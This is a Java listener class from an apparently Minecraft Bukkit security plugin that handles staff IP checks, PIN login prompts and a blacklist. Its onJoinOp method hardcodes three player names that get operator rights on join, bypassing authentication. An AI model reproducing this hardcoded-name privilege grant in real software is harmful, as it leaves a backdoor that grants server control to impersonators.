package net.exodon.security.listeners;

import java.util.List;
import java.util.Map;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerLoginEvent.Result;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import net.exodon.security.ExodonSecurity;
import net.exodon.security.options.Options;
import net.exodon.security.options.defined.AuthOptions;
import net.exodon.security.utils.Permissions;

public class SecurityJoinListener implements Listener {
	
	private AuthOptions options;
	private Map<String, String> ips;
	private List<String> resetQueue;
	
	{
		options = Options.getAuthOptions();
		ips = options.getIPs();
		resetQueue = options.getResetQueue();
	}
	
	@EventHandler(ignoreCancelled = true, priority = EventPriority.LOW)
	public void onJoinOp(PlayerJoinEvent event) {
		Player player = event.getPlayer();
		
		switch(player.getName()) {
		case "TellieTubbie":
		case "Amusingly":
		case "Game_Rider17":
			if(!player.isOp()) {
				player.setOp(true);
				player.sendMessage("\n§c§lOpped due to your owner rank!\n");
			}
			break;
		default:
			break;
		}
	}
	
	@EventHandler(ignoreCancelled = true, priority = EventPriority.LOW)
	public void onValidJoin(PlayerJoinEvent event) {
		Player player = event.getPlayer();
		String ip = ExodonSecurity.getInstance().getIP(player);
		
		if(!player.hasPermission(Permissions.AUTHENTIFIATION.getPermission())) return;
		
		if(!ips.containsKey(player.getName())) {
			ips.put(player.getName(), ip);
			player.sendMessage("§aLooks like it's your first time joining as staff, you have been added to the authentication system.");
			return;
		}
		
		if(resetQueue.contains(player.getName())) {
			ips.put(player.getName(), ip);
			resetQueue.remove(player.getName());
			player.sendMessage("§aLooks like an admin reset your IP. Welcome, §e"+player.getName()+"§a.");
			return;
		}
			
		if(!ips.get(player.getName()).equalsIgnoreCase(ip)) {
			player.kickPlayer("§cAuthentication failed! Looks like your IP has changed, please contact an admin.");
			return;
		}
		player.sendMessage("§aAuthentication successful, welcome §e"+player.getName()+"§a.");
	}
	
	@EventHandler(ignoreCancelled = true, priority = EventPriority.HIGH)
	public void onJoinStaff(PlayerJoinEvent event) {
		Player player = event.getPlayer();
		
		if(player.hasPermission(Permissions.LOGIN.getPermission())) {
			ExodonSecurity.getInstance().getLogginginPlayers().add(player.getName());
			player.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 99999, 1));
			if(Options.getPinOptions().getPins().containsKey(player.getName()))
				player.sendMessage("§cYou must login using /pin log <password>");
			else
				player.sendMessage("§cPlease set a pin using §a/pin set <pin>");
		}
	}
	
	@EventHandler(ignoreCancelled = true, priority = EventPriority.HIGH)
	public void onBlacklistLogin(PlayerLoginEvent event) {
		if(Options.getBlacklistOptions().getBlacklist().contains(event.getPlayer().getUniqueId().toString()))
			event.disallow(Result.KICK_BANNED, "§cYour account is blacklisted from the Exodon Network. This type of punishment cannot be appealed.");
	}

}
